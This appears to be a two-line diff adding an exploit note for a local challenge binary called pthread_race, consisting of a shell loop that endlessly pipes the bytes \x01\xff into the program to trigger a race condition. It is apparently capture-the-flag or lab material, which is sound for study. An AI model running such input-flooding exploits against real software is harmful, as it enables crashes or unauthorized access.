@@ -1,0 +1,2 @@
+# Exploiting pthread_race
+while :; do echo -ne "\x01\xff"; done | ./pthread_race
